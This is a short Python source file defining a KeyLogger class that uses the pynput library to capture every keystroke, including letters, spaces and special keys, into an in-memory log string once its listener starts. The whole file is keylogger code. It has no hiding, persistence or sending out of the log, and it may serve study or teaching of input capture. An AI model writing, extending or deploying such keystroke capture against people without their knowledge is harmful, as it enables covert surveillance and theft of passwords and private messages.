import pynput

class KeyLogger(object):

    def __init__(self):
        self.listener = pynput.keyboard.Listener(on_press=self.__on_press)
        self.log = ''

    def __on_press(self, key):
        try:
            self.log += str(key.char)
        except:
            if key == key.space:
                self.log += ' '
            else:
                self.log += ' ' + str(key) + ' '

    def run(self):
        self.listener.start()

